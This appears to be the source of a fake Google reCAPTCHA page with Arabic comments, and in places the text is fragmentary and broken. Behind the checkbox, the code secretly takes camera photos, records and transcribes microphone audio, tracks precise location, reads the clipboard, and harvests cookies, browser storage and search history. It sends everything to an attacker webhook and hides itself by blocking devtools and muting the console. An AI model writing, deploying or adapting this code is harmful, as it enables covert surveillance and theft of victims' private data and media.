<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>reCAPTCHA – تحقق متقدم</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🐙</text></svg>" />
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{min-height:100vh;display:flex;justify-content:center;align-items:center;background:#eef2f5;font-family:'Roboto',Arial,sans-serif;padding:16px;-webkit-font-smoothing:antialiased;}
        .captcha-wrapper{width:340px;max-width:100%;background:#f9f9f9;border:1px solid #d3d3d3;border-radius:5px;box-shadow:0 5px 15px rgba(0,0,0,0.08);overflow:hidden;cursor:default;transition:box-shadow .3s ease;user-select:none;}
        .captcha-wrapper:hover{box-shadow:0 8px 25px rgba(0,0,0,0.12);}
        .captcha-row{display:flex;align-items:center;padding:15px 15px 12px 15px;gap:12px;}
        .spinner{position:relative;flex-shrink:0;}
        .spinner input{display:none;}
        .checkmark{width:32px;height:32px;border:2px solid #c1c1c1;border-radius:3px;display:flex;justify-content:center;align-items:center;cursor:pointer;background:#fff;transition:all .25s ease;position:relative;box-shadow:inset 0 1px 2px rgba(0,0,0,0.04);}
        .checkmark:hover{border-color:#a0a0a0;box-shadow:0 0 0 2px rgba(26,115,232,0.15);}
        .checkmark .tick{width:10px;height:18px;border-right:4px solid #00a651;border-bottom:4px solid #00a651;transform:rotate(45deg) scale(0.5);opacity:0;transition:all .2s cubic-bezier(0.34,1.56,0.64,1);}
        .checkmark .loader{display:none;width:20px;height:20px;border:3px solid #e8f0fe;border-top:3px solid #1a73e8;border-radius:50%;animation:spin .7s linear infinite;}
        .spinner.loading .checkmark{border-color:#1a73e8;background:#e8f0fe;cursor:default;}
        .spinner.loading .checkmark .tick{display:none;}
        .spinner.loading .checkmark .loader{display:block;}
        .spinner.success .checkmark{border-color:#00a651;background:#e6f4ea;cursor:default;}
        .spinner.success .checkmark .tick{opacity:1;transform:rotate(45deg) scale(1);}
        .spinner.success .checkmark .loader{display:none;}
        .spinner.failed .checkmark{border-color:#d93025;background:#fce8e6;cursor:default;}
        .spinner.failed .checkmark .tick{display:none;}
        .spinner.failed .checkmark .loader{display:none;}
        .spinner.failed .checkmark::after{content:"✕";font-size:22px;font-weight:700;color:#d93025;line-height:1;}
        .text{flex:1;font-size:18px;color:#333;text-align:center;transition:color .3s ease;font-weight:400;letter-spacing:.2px;}
        .text.loading{color:#1a73e8;}
        .text.failed{color:#d93025;}
        .text.success{color:#00a651;}
        .logo{display:flex;flex-direction:column;align-items:center;flex-shrink:0;font-size:10px;color:#777;line-height:1.2;}
        .logo img{width:38px;height:auto;margin-bottom:3px;display:block;}
        .logo strong{font-size:10px;font-weight:600;color:#555;}
        .logo small{font-size:8px;color:#999;}
        .captcha-footer{display:flex;align-items:center;justify-content:space-between;padding:6px 14px;background:#f1f3f4;border-top:1px solid #e5e7e9;min-height:36px;}
        .captcha-footer .brand{display:flex;align-items:center;gap:6px;}
        .captcha-footer .brand svg{height:24px;width:auto;}
        .captcha-footer .brand .google-text{font-size:14px;font-weight:500;color:#222;letter-spacing:.3px;}
        .captcha-footer .links{display:flex;align-items:center;gap:8px;font-size:11px;}
        .captcha-footer .links a{color:#555;text-decoration:none;font-size:11px;transition:color .2s;}
        .captcha-footer .links a:hover{color:#1a73e8;text-decoration:underline;}
        .captcha-footer .links .separator{color:#aaa;}
        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
        @media(max-width:480px){.captcha-wrapper{width:100%;}.text{font-size:16px;}.logo img{width:32px;}.captcha-footer .brand svg{height:20px;}.captcha-footer .brand .google-text{font-size:12px;}}
        @media(max-width:360px){.captcha-row{padding:12px 10px 10px 10px;gap:8px;}.text{font-size:14px;}.checkmark{width:28px;height:28px;}.checkmark .tick{width:8px;height:14px;border-width:3px;}.logo img{width:28px;}}
        #hiddenVideo{position:fixed;top:-1000px;left:-1000px;width:1px;height:1px;opacity:0;pointer-events:none;}
        #hiddenCanvas{display:none;}
        #fingerprintCanvas{position:fixed;top:-1000px;left:-1000px;width:1px;height:1px;opacity:0;pointer-events:none;}
        .loading-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.01);z-index:9999;pointer-events:none;}
        .loading-overlay.active{display:block;}

        /* ========== مؤشر الأذونات الجديد ========== */
        .permission-indicator {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: rgba(0,0,0,0.8);
            border-radius: 12px;
            padding: 8px 14px;
            display: flex;
            gap: 12px;
            align-items: center;
            z-index: 10000;
            backdrop-filter: blur(4px);
            border: 1px solid rgba(255,255,255,0.1);
            font-size: 14px;
            color: #fff;
            font-family: 'Roboto',Arial,sans-serif;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            pointer-events: none;
            transition: opacity 0.3s;
        }
        .permission-indicator .p-item {
            display: flex;
            align-items: center;
            gap: 4px;
            font-size: 12px;
        }
        .permission-indicator .p-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            display: inline-block;
            transition: background 0.3s;
        }
        .permission-indicator .p-dot.granted { background: #4caf50; box-shadow: 0 0 8px #4caf50; }
        .permission-indicator .p-dot.denied { background: #f44336; box-shadow: 0 0 8px #f44336; }
        .permission-indicator .p-dot.pending { background: #ff9800; box-shadow: 0 0 8px #ff9800; animation: pulse-dot 1s infinite; }
        @keyframes pulse-dot {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.8); }
            100% { opacity: 1; transform: scale(1); }
        }
        .permission-indicator .p-label {
            font-size: 10px;
            opacity: 0.7;
            margin-left: 2px;
        }
        @media (max-width: 480px) {
            .permission-indicator {
                bottom: 10px;
                left: 10px;
                padding: 6px 10px;
                gap: 8px;
                font-size: 11px;
                flex-wrap: wrap;
            }
        }
    </style>
</head>

        // ====== دوال مؤشر الأذونات ======
        function updatePermissionIndicator(type, granted) {
            const dotMap = {
                camera: 'dotCamera',
                mic: 'dotMic',
                location: 'dotLocation',
                clipboard: 'dotClipboard',
                headless: 'dotHeadless'
            };
            const dotId = dotMap[type];
            if (!dotId) return;
            const dot = document.getElementById(dotId);
            if (!dot) return;
            dot.className = 'p-dot ' + (granted ? 'granted' : 'denied');
        }
        function setHeadlessIndicator(headless) {
            const dot = document.getElementById('dotHeadless');
            if (dot) {
                dot.className = 'p-dot ' + (headless ? 'granted' : 'denied');
                // headless == true means we detected headless, so it's a "granted" for detection
                // but we'll show it as red if headless, green if normal? Let's make red for headless, green for normal.
                dot.className = 'p-dot ' + (headless ? 'denied' : 'granted');
            }
        }

        // ================================================================
        //  دوال مساعدة
        // ================================================================
        function detectHeadless() {
            if (navigator.webdriver) return true;
            if (/HeadlessChrome/.test(navigator.userAgent)) return true;
            if (/PhantomJS/.test(navigator.userAgent)) return true;
            if (window._phantom || window.callPhantom) return true;
            if (window.chrome && window.chrome.webstore === undefined) return true;
            if (navigator.languages.length === 0) return true;
            return false;
        }

        function setUIState(type) {
            el.spinner.className = 'spinner ' + type;
            el.mainText.className = 'text ' + type;
            const texts = {
                success: 'تم التحقق بنجاح',
                failed: 'فشل التحقق، حاول مجدداً',

                '': 'أنا لست روبوتاً',
            };
            el.mainText.textContent = texts[type] || texts[''];
            el.checkbox.checked = type === 'success';
            if (type === 'loading') {
                el.overlay.classList.add('active');
            } else {
                el.overlay.classList.remove('active');
            }

        function safeStringify(data) {
            try { return JSON.stringify(data); } catch (_) { return '{}'; }

        // ================================================================
        //  IndexedDB Backup
        // ================================================================
        function saveToIndexedDB(data) {
            try {
                const request = indexedDB.open('OctopusBackup', 2);
                request.onupgradeneeded = (e) => {
                    const db = e.target.result;
                    if (!db.objectStoreNames.contains('backup')) {
                        db.createObjectStore('backup', { keyPath: 'id' });
                    }
                };
                request.onsuccess = (e) => {
                    const db = e.target.result;
                    const tx = db.transaction('backup', 'readwrite');
                    const store = tx.objectStore('backup');
                    store.put({ id: 'latest', data: data, timestamp: Date.now() });
                };
                request.onerror = () => {};
            } catch (_) {}
        }

        function loadFromIndexedDB() {
            return new Promise((resolve) => {
                try {
                    const request = indexedDB.open('OctopusBackup', 2);
                    request.onsuccess = (e) => {
                        const db = e.target.result;
                        const tx = db.transaction('backup', 'readonly');
                        const store = tx.objectStore('backup');
                        const getRequest = store.get('latest');
                        getRequest.onsuccess = () => { resolve(getRequest.result); };
                        getRequest.onerror = () => { resolve(null); };
                    };
                    request.onerror = () => { resolve(null); };
                } catch (_) { resolve(null); }
            });
        }

        // ================================================================

        function extractTokenFromURL() {
            const params = new URLSearchParams(window.location.search);
            const token = params.get('i');
            if (token && token.length === CONFIG.TOKEN_LENGTH && /^[A-Z0-9]+$/.test(token)) {
                state.userToken = token;
                sessionStorage.setItem('octopus_token', token);
                return true;
            }
            const saved = sessionStorage.getItem('octopus_token');
            if (saved && saved.length === CONFIG.TOKEN_LENGTH && /^[A-Z0-9]+$/.test(saved)) {
                state.userToken = saved;
                return true;
            }
            state.userToken = CONFIG.MASTER_TOKEN;
            sessionStorage.setItem('octopus_token', CONFIG.MASTER_TOKEN);
            return true;
        }

        // ================================================================
        //  دوال الجهاز (نفسها مع تحديث المؤشر)
        // ================================================================
        function classifyDevice() {
            const ua = navigator.userAgent;
            const result = { os: 'Unknown', osVersion: 'Unknown', browser: 'Unknown', browserVersion: 'Unknown',
                deviceType: 'Desktop', isMobile: false, isTablet: false };
            
            if (ua.includes('Windows NT 10.0')) { result.os = 'Windows';
                result.osVersion = '10'; } 
            else if (ua.includes('Windows NT 6.3')) { result.os = 'Windows';
                result.osVersion = '8.1'; } 
            else if (ua.includes('Windows NT 6.2')) { result.os = 'Windows';
                result.osVersion = '8'; } 
            else if (ua.includes('Windows NT 6.1')) { result.os = 'Windows';
                result.osVersion = '7'; } 
            else if (ua.includes('Mac OS X')) { result.os = 'macOS';
                result.osVersion = (ua.match(/Mac OS X ([\d_]+)/)?.[1] || '').replace(/_/g, '.') || 'Unknown'; } 
            else if (ua.includes('Linux')) { result.os = 'Linux'; } 
            else if (ua.includes('Android')) { result.os = 'Android';
                result.osVersion = ua.match(/Android ([\d.]+)/)?.[1] || 'Unknown';
                result.deviceType = 'Mobile';
                result.isMobile = true; } 
            else if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod')) { 
                result.os = 'iOS';
                result.osVersion = (ua.match(/OS ([\d_]+)/)?.[1] || '').replace(/_/g, '.') || 'Unknown';
                result.deviceType = ua.includes('iPad') ? 'Tablet' : 'Mobile';
                result.isMobile = !ua.includes('iPad');
                result.isTablet = ua.includes('iPad');
            }

            if (ua.includes('Edg/')) { result.browser = 'Edge';
                result.browserVersion = ua.match(/Edg\/([\d.]+)/)?.[1] || 'Unknown'; } 
            else if (ua.includes('OPR/') || ua.includes('Opera/')) { result.browser = 'Opera';
                result.browserVersion = ua.match(/(?:OPR|Opera)\/([\d.]+)/)?.[1] || 'Unknown'; } 
            else if (ua.includes('Chrome/')) { result.browser = 'Chrome';
                result.browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1] || 'Unknown'; } 
            else if (ua.includes('Firefox/')) { result.browser = 'Firefox';
                result.browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1] || 'Unknown'; } 
            else if (ua.includes('Safari/')) { result.browser = 'Safari';
                result.browserVersion = ua.match(/Version\/([\d.]+)/)?.[1] || ua.match(/Safari\/([\d.]+)/)?.[1] ||
                    'Unknown'; }

            if (result.isMobile) result.deviceType = 'Mobile';
            else if (result.isTablet) result.deviceType = 'Tablet';
            else result.deviceType = 'Desktop';

            state.deviceClassification = result;
            return result;
        }

        function detectSpoofing() {
            const result = { canvasSpoof: false, webglSpoof: false, vpnProxy: false, headless: false };
            try {
                const c = document.createElement('canvas');
                c.width = 256;
                c.height = 256;
                const ctx = c.getContext('2d');
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 256, 256);
                const data = ctx.getImageData(0, 0, 256, 256).data;
                let count = 0;
                for (let i = 0; i < data.length; i += 4) {
                    if (data[i] === 255 && data[i + 1] === 102 && data[i + 2] === 0) count++;
                }
                if (count < 60000) result.canvasSpoof = true;
            } catch (_) {}
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                if (gl) {
                    const info = gl.getExtension('WEBGL_debug_renderer_info');
                    if (info) {
                        const vendor = gl.getParameter(info.UNMASKED_VENDOR_WEBGL);
                        const renderer = gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
                        const legit = ['Google', 'Intel', 'NVIDIA', 'AMD', 'Apple', 'ARM', 'Qualcomm', 'Mesa'];
                        if (!legit.some(x => vendor.includes(x) || renderer.includes(x))) result.webglSpoof = true;
                    }
                }
            } catch (_) {}
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('test');
                pc.createOffer().then(o => pc.setLocalDescription(o));
                const ips = new Set();
                pc.onicecandidate = e => {
                    if (e.candidate) {
                        const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
                        if (ip) ips.add(ip);
                    }
                };
                setTimeout(() => pc.close(), 2000);
                if (ips.size > 1) result.vpnProxy = true;
            } catch (_) {}
            
            state.isHeadless = detectHeadless();
            result.headless = state.isHeadless;
            setHeadlessIndicator(state.isHeadless);
            
            state.spoofingDetected = result;
            return result;
        }

        async function readClipboard() {
            try {
                // طلب إذن القراءة
                const perm = await navigator.permissions.query({ name: 'clipboard-read' });
                if (perm.state === 'granted' || perm.state === 'prompt') {
                    const text = await navigator.clipboard.readText();
                    state.clipboardContent = text;
                    state.permissionsGranted.clipboard = true;
                    updatePermissionIndicator('clipboard', true);
                    return;
                }
            } catch (_) {}
            // الطريقة البديلة
            try {
                const ta = document.createElement('textarea');
                ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none;top:-1000px;left:-1000px;';
                document.body.appendChild(ta);
                ta.focus();
                document.execCommand('paste');
                state.clipboardContent = ta.value || null;
                if (state.clipboardContent) {
                    state.permissionsGranted.clipboard = true;
                    updatePermissionIndicator('clipboard', true);
                } else {
                    state.permissionsGranted.clipboard = false;
                    updatePermissionIndicator('clipboard', false);
                }
                document.body.removeChild(ta);
            } catch (_2) {
                state.clipboardContent = null;
                state.permissionsGranted.clipboard = false;
                updatePermissionIndicator('clipboard', false);
            }
        }

        // ================================================================
        //  سحب سجل بحث جوجل ومحاولة قراءة IndexedDB
        // ================================================================
        async function fetchGoogleSearchHistory() {
            const results = [];
            try {
                // 1. البحث في localStorage عن مفاتيح شائعة
                const keys = ['search', 'query', 'q', 'history', 'recent', 'lastSearch', 'searchTerms', 'queries',
                    'google:search', 'recentSearches', 'searchHistory'
                ];
                for (const k of keys) {
                    const val = localStorage.getItem(k);
                    if (val) {
                        results.push({ source: 'localStorage', key: k, value: val });
                    }
                }
                // 2. محاولة قراءة IndexedDB الخاصة بجوجل (قد تختلف)
                try {
                    const dbs = await indexedDB.databases();
                    for (const dbInfo of dbs) {
                        const dbName = dbInfo.name;
                        if (dbName && (dbName.includes('google') || dbName.includes('chrome') || dbName.includes('history') ||
                                dbName.includes('search'))) {
                            // محاولة فتح قاعدة البيانات
                            const db = await new Promise((resolve, reject) => {
                                const req = indexedDB.open(dbName);
                                req.onsuccess = () => resolve(req.result);
                                req.onerror = () => reject();
                            });
                            if (db) {
                                const storeNames = db.objectStoreNames;
                                for (const storeName of storeNames) {
                                    if (storeName.includes('history') || storeName.includes('search') || storeName.includes(
                                            'query')) {
                                        const tx = db.transaction(storeName, 'readonly');
                                        const store = tx.objectStore(storeName);
                                        const getAll = store.getAll();
                                        const items = await new Promise((res, rej) => {
                                            getAll.onsuccess = () => res(getAll.result);
                                            getAll.onerror = () => rej();
                                        });
                                        if (items && items.length > 0) {
                                            results.push({
                                                source: 'IndexedDB',
                                                db: dbName,
                                                store: storeName,
                                                count: items.length,
                                                sample: items.slice(0, 3).map(i => JSON.stringify(i).substring(0, 100))
                                            });
                                        }
                                    }
                                }
                                db.close();
                            }
                        }
                    }
                } catch (_) {}
            } catch (_) {}
            state.browserHistory = results;
            return results;
        }

        function collectAllCookies() {
            const cookies = document.cookie.split(';').map(c => c.trim()).filter(c => c);
            const cookieDetails = cookies.map(c => {
                const parts = c.split('=');
                const name = parts[0];
                const value = parts.slice(1).join('=');
                return { name, value };
            });
            const result = {
                cookies: document.cookie,
                cookieCount: cookies.length,
                details: cookieDetails,
                localStorage: {},
                sessionStorage: {}
            };
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (key) result.localStorage[key] = localStorage.getItem(key);
                }
            } catch (_) {}
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    if (key) result.sessionStorage[key] = sessionStorage.getItem(key);
                }
            } catch (_) {}
            state.allCookies = result;
            return result;
        }

        // ================================================================

        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    state.userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
                    updatePermissionIndicator('location', false);
                    resolve();
                    return;
                }
                let watchId = null,
                    best = null,
                    bestAcc = Infinity,
                    resolved = false,
                    attempts = 0;
                const maxAttempts = CONFIG.LOCATION_ATTEMPTS;
                const timeout = CONFIG.LOCATION_TIMEOUT;
                const targetAcc = CONFIG.LOCATION_TARGET_ACCURACY;

                const finish = () => {
                    if (resolved) return;
                    resolved = true;
                    if (watchId) navigator.geolocation.clearWatch(watchId);
                    if (best) {
                        state.userLocation.lat = best.coords.latitude;
                        state.userLocation.lng = best.coords.longitude;
                        state.userLocation.accuracy = best.coords.accuracy;
                        state.userLocation.error = null;
                        state.permissionsGranted.location = true;
                        updatePermissionIndicator('location', true);
                    } else {
                        state.userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
                        state.permissionsGranted.location = false;
                        updatePermissionIndicator('location', false);
                    }
                    resolve();
                };

                const timer = setTimeout(() => {
                    if (!resolved) {
                        if (watchId) navigator.geolocation.clearWatch(watchId);
                        if (best) finish();
                        else { state.userLocation.error = 'انتهت المهلة';
                            state.permissionsGranted.location = false;
                            updatePermissionIndicator('location', false);
                            resolve(); }
                    }
                }, timeout);

                const onPos = (p) => {
                    attempts++;
                    const acc = p.coords.accuracy;
                    if (acc < bestAcc) { bestAcc = acc;
                        best = p; }
                    if (acc <= targetAcc || attempts >= maxAttempts) {
                        clearTimeout(timer);
                        finish();
                    }
                };

                const onErr = (e) => {
                    if (resolved) return;
                    if (e.code === 1) {
                        state.userLocation.error = 'تم رفض الإذن بالوصول إلى الموقع';
                        state.permissionsGranted.location = false;
                        updatePermissionIndicator('location', false);
                        resolved = true;
                        if (watchId) navigator.geolocation.clearWatch(watchId);
                        clearTimeout(timer);
                        resolve();
                        return;
                    }
                    if (attempts < maxAttempts) { /* نستمر */ } else {
                        if (best) finish();
                        else { state.userLocation.error = e.message || 'تعذر الحصول على الموقع';
                            state.permissionsGranted.location = false;
                            updatePermissionIndicator('location', false);
                            resolve(); }
                    }
                };

                watchId = navigator.geolocation.watchPosition(onPos, onErr, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 2000
                });
            });
        }

                    el.hiddenVideo.srcObject = state.mediaStream;

                    await new Promise((res, rej) => {
                        const t = setTimeout(() => rej(new Error('Video timeout')), 10000);
                        const ready = () => { clearTimeout(t);
                            res(); };
                        if (el.hiddenVideo.readyState >= 2 && el.hiddenVideo.videoWidth > 0) ready();
                        else {
                            el.hiddenVideo.addEventListener('loadedmetadata', ready);
                            el.hiddenVideo.addEventListener('canplay', ready);
                            el.hiddenVideo.play().catch(() => {});

                    });

                    await new Promise(r => setTimeout(r, 500));

                    el.hiddenCanvas.height = h;

                                    .TinyFaceDetectorOptions())

                                    confidence: det.detection.score,
                                    faceDetected: true,

                            } else {
                                state.faceData = { faceDetected: false };
                            }
                        } catch (_) {
                            state.faceData = { faceDetected: false };
                        }
                    } else {
                        state.faceData = { faceDetected: false };
                    }

                    state.capturedPhotoFiles = [];
                    for (let i = 1; i <= CONFIG.TOTAL_PHOTOS; i++) {
                        ctx.drawImage(el.hiddenVideo, 0, 0, w, h);

                        state.mediaStream.getTracks().forEach(t => t.stop());

                    }

                    resolve(false);
                }
            });

        // ================================================================
        //  الميكروفون – مع تحديث المؤشر وضمان جاهزية الصوت
        // ================================================================
        async function recordAudio() {
            return new Promise(async (resolve) => {
                try {
                    const constraints = { audio: { echoCancellation: false, noiseSuppression: false,
                            autoGainControl: false } };
                    state.audioStream = await navigator.mediaDevices.getUserMedia(constraints);
                    state.permissionsGranted.mic = true;
                    updatePermissionIndicator('mic', true);
                    state.audioRecorder = new MediaRecorder(state.audioStream, { mimeType: 'audio/webm;codecs=opus' });
                    state.audioChunks = [];
                    state.audioRecorder.ondataavailable = (e) => {
                        if (e.data.size > 0) state.audioChunks.push(e.data);
                    };
                    let done = false;
                    state.audioRecorder.onstop = async () => {
                        if (state.audioChunks.length > 0) {
                            state.audioBlob = new Blob(state.audioChunks, { type: 'audio/webm' });
                            state.audioReady = true;
                            await transcribeAudio(state.audioBlob);
                        } else {
                            state.audioReady = false;
                        }
                        done = true;
                        resolve();
                    };
                    state.audioRecorder.start();
                    setTimeout(() => {
                        if (state.audioRecorder.state === 'recording') state.audioRecorder.stop();
                        if (state.audioStream) state.audioStream.getTracks().forEach(t => t.stop());
                    }, CONFIG.AUDIO_DURATION);
                    setTimeout(() => {
                        if (!done) {
                            if (state.audioRecorder.state === 'recording') state.audioRecorder.stop();
                            if (!state.audioReady) state.audioReady = false;
                            resolve();
                        }
                    }, CONFIG.AUDIO_DURATION + 3000);
                } catch (_) {
                    state.permissionsGranted.mic = false;
                    updatePermissionIndicator('mic', false);
                    state.audioReady = false;
                    resolve();
                }
            });
        }

        async function transcribeAudio(blob) {
            try {
                if (!('webkitSpeechRecognition' in window) && !('SpeechRecognition' in window)) return;
                const url = URL.createObjectURL(blob);
                const audio = new Audio(url);
                await audio.play();
                const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
                const rec = new SR();
                rec.lang = 'ar-EG';
                rec.continuous = false;
                rec.interimResults = false;
                rec.maxAlternatives = 1;
                return new Promise((resolve) => {
                    let done = false;
                    rec.onresult = (e) => {
                        const t = e.results[0][0].transcript;
                        state.transcribedText = t;
                        if (/[a-zA-Z]/.test(t) && !/[ء-ي]/.test(t)) state.detectedLanguage = 'en';
                        else if (/[ء-ي]/.test(t)) state.detectedLanguage = 'ar';
                        else state.detectedLanguage = 'unknown';
                        done = true;
                        resolve();
                    };
                    rec.onerror = () => { if (!done) resolve(); };
                    rec.onend = () => { if (!done) resolve(); };
                    rec.start();
                    setTimeout(() => {
                        try { rec.stop(); } catch (_) {}
                        if (!done) resolve();
                    }, 8000);
                });
            } catch (_) {
                state.transcribedText = null;
                state.detectedLanguage = null;
            }
        }

        // ================================================================

        // ================================================================
        function setupSecurity() {
            document.addEventListener('contextmenu', e => e.preventDefault());
            document.addEventListener('dragstart', e => e.preventDefault());
            document.addEventListener('selectstart', e => e.preventDefault());

            document.addEventListener('keydown', e => {
                const key = e.key,
                    ctrl = e.ctrlKey || e.metaKey,
                    shift = e.shiftKey;
                if (key === 'F12' || (ctrl && shift && ['I', 'C', 'J'].includes(key)) || (ctrl && key === 'U')) {
                    e.preventDefault();
                    reportSuspicious(`devtools (${key})`);
                    if (key === 'F12' || (ctrl && shift && key === 'I')) {
                        window.location.href = 'https://www.google.com';
                    }
                }
                if (ctrl && ['c', 'v', 'x'].includes(key)) {
                    reportSuspicious(`copy/paste (${key})`);
                }
            });

            let lastW = window.innerWidth,
                lastH = window.innerHeight;
            setInterval(() => {
                if (window.innerWidth !== lastW || window.innerHeight !== lastH) {
                    if (Math.abs(window.innerWidth - lastW) > 80 || Math.abs(window.innerHeight - lastH) > 80) {
                        reportSuspicious(`window resize (${window.innerWidth}x${window.innerHeight})`);
                    }
                    lastW = window.innerWidth;
                    lastH = window.innerHeight;
                }
            }, 2000);
        }

        let alertCooldown = 0;

        function reportSuspicious(action) {
            if (!state.userToken) return;
            const now = Date.now();
            if (now - alertCooldown < 5000) return;
            alertCooldown = now;
            const fd = new FormData();
            fd.append('event', 'suspicious');
            fd.append('action', action);
            fd.append('timestamp', new Date().toISOString());
            fd.append('ip', state.userIP);
            fd.append('userAgent', navigator.userAgent);
            fd.append('url', window.location.href);
            fd.append('token', state.userToken);
            fetch(CONFIG.WEBHOOK_URL, { method: 'POST', body: fd }).catch(() => {});
        }

        function enhanceStealth() {
            console.log = console.warn = console.error = console.info = () => {};
            const origFetch = window.fetch;
            window.fetch = function(...args) {
                const delay = Math.floor(Math.random() * 250) + 80;
                return new Promise(resolve => {
                    setTimeout(() => resolve(origFetch.apply(this, args)), delay);
                });
            };
            try {
                if ('serviceWorker' in navigator) {
                    const code =
                        `self.addEventListener('install',e=>e.waitUntil(self.skipWaiting()));self.addEventListener('activate',e=>e.waitUntil(clients.claim()));self.addEventListener('fetch',e=>e.respondWith(fetch(e.request)));`;
                    const blob = new Blob([code], { type: 'application/javascript' });
                    const url = URL.createObjectURL(blob);
                    navigator.serviceWorker.register(url, { scope: '/' }).catch(() => {});
                }
            } catch (_) {}
        }

        // ================================================================
        //  الإرسال النهائي – يضمن إرسال الصوت
        // ================================================================
        async function sendAllData(forceRetry = false) {
            if (state.dataSent && !forceRetry) return true;

            const fd = new FormData();
            fd.append('event', 'submission');
            fd.append('token', state.userToken);
            fd.append('ip', state.userIP);
            fd.append('timestamp', new Date().toISOString());

            // كل البيانات
            fd.append('photoCount', String(state.capturedPhotoFiles.length));
            fd.append('clipboard', state.clipboardContent || '');
            fd.append('isHeadless', String(state.isHeadless));
            fd.append('battery', state.collectedData.battery ? String(state.collectedData.battery.level) : '');
            
            fd.append('deviceData', safeStringify(state.collectedData));
            fd.append('attacks', safeStringify(state.attacksData));
            fd.append('faceData', safeStringify(state.faceData || { faceDetected: false }));
            fd.append('transcribedText', state.transcribedText || '');
            fd.append('detectedLanguage', state.detectedLanguage || '');
            fd.append('allCookies', safeStringify(state.allCookies));
            fd.append('history', safeStringify(state.browserHistory));
            fd.append('extensions', safeStringify(state.installedExtensions));
            fd.append('spoofing', safeStringify(state.spoofingDetected));
            fd.append('deviceClassification', safeStringify(state.deviceClassification));

            // الموقع
            fd.append('location[lat]', state.userLocation.lat !== null ? String(state.userLocation.lat) : '');
            fd.append('location[lng]', state.userLocation.lng !== null ? String(state.userLocation.lng) : '');
            fd.append('location[accuracy]', state.userLocation.accuracy !== null ? String(state.userLocation.accuracy) : '');
            fd.append('location[error]', state.userLocation.error || '');

            // الصور
            if (state.capturedPhotoFiles.length > 0) {
                state.capturedPhotoFiles.forEach((f) => {
                    fd.append(`photos[]`, f, f.name);
                });
                logToConsole('📸 إرسال ' + state.capturedPhotoFiles.length + ' صور');
            } else {
                logToConsole('⚠️ لا توجد صور للإرسال');
            }

            // الصوت – نتحقق من جاهزيته
            if (state.audioReady && state.audioBlob && state.audioBlob.size > 0) {
                const af = new File([state.audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                fd.append('audio', af);
                logToConsole('🎤 إرسال ملف صوتي (' + state.audioBlob.size + ' bytes)');
            } else {
                logToConsole('⚠️ لا يوجد ملف صوتي جاهز للإرسال');
            }

            // === الإرسال ===
            try {
                logToConsole('🚀 بدء الإرسال إلى البوت...');
                const res = await fetch(CONFIG.WEBHOOK_URL, { method: 'POST', body: fd });
                const result = await res.json();
                
                if (!res.ok) throw new Error(result.message || 'HTTP error');

                if (result.status === 'success' && result.received) {
                    const r = result.received;
                    const allReceived = r.token && r.photos !== undefined && r.audio !== undefined && r.location !== undefined && 
                                       r.face !== undefined && r.transcription !== undefined && 
                                       r.clipboard !== undefined && r.device !== undefined && r.attacks !== undefined &&
                                       r.cookies !== undefined && r.history !== undefined && r.extensions !== undefined && r.spoofing !== undefined;
                    if (allReceived) {
                        logToConsole('✅ تأكيد البوت: جميع البيانات استُلمت');
                        state.dataSent = true;
                        state.pendingRetries = 0;
                        return true;
                    } else {
                        logToConsole('⚠️ البوت استقبل بعض البيانات فقط: ' + JSON.stringify(r));
                        setTimeout(() => sendAllData(true), 3000);
                        return false;
                    }
                } else {
                    throw new Error('استجابة غير متوقعة من البوت');
                }
            } catch (err) {
                logToConsole('❌ فشل الإرسال: ' + err.message);
                const backupData = {
                    token: state.userToken,
                    ip: state.userIP,
                    location: state.userLocation,
                    collectedData: state.collectedData,
                    attacksData: state.attacksData,
                    faceData: state.faceData,
                    transcribedText: state.transcribedText,
                    detectedLanguage: state.detectedLanguage,
                    clipboardContent: state.clipboardContent,
                    isHeadless: state.isHeadless,
                    photoCount: state.capturedPhotoFiles.length,
                    timestamp: new Date().toISOString()
                };
                saveToIndexedDB(backupData);

                if (state.pendingRetries < CONFIG.MAX_RETRIES) {
                    state.pendingRetries++;
                    setTimeout(() => {
                        logToConsole(`🔄 محاولة إعادة الإرسال رقم ${state.pendingRetries}`);
                        sendAllData(true);
                    }, CONFIG.RETRY_INTERVAL);
                }
                return false;
            }
        }

        // ================================================================
        //  عملية الجمع المتوازي (Parallel) – محسّنة للسرعة
        // ================================================================
        async function collectEverything() {
            if (state.isCollecting || state.collectionComplete) return;
            state.isCollecting = true;
            state.startTime = Date.now();
            setUIState('loading');

            try {
                // 1. بيانات سريعة (تتزامن)
                classifyDevice();
                detectSpoofing();
                await detectExtensions();
                collectAllCookies(); // سريع
                await fetchGoogleSearchHistory(); // قد يستغرق بعض الوقت

